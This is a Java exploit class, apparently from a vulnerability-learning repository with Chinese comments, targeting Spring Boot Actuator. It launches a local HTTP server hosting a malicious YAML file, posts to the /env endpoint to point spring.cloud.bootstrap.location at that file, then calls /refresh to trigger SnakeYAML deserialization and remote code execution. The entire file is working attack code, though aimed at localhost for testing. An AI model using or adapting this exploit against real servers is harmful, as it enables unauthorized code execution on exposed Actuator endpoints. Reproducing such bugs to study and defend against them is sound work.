/*
 * [业务问题]: Spring Boot Actuator /env 端点利用 SnakeYAML 漏洞。
 * [实现逻辑]: 通过 /env 注入 spring.cloud.bootstrap.location 配置项，指向恶意的 YAML 文件，然后触发 /refresh 使配置生效，利用 SnakeYAML 反序列化触发 RCE。
 */
package com.security.bug.spring.actuator;

import com.security.bug.common.server.HTTPServer;
import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * Spring Boot Actuator SnakeYAML 攻击验证。
 */
public class AttackSnakeYaml {

  static {
    HTTPServer.filePath = "/Users/xuanyonghao/security/java/my-project/learnjavabug/spring/spring-boot-actuator-bug/actuator-1.3/src/main/resources/snake-yaml-evil.yml";
    HTTPServer.contentType = "text/xml";
    HTTPServer.PORT = 23222;
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "spring.cloud.bootstrap.location=http://127.0.0.1:23222/snake-yaml-evil.yml";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/x-www-form-urlencoded", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
//          .setProxy(new HttpHost("127.0.0.1", 8080))
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/refresh");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
//          .setProxy(new HttpHost("127.0.0.1", 8080))
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
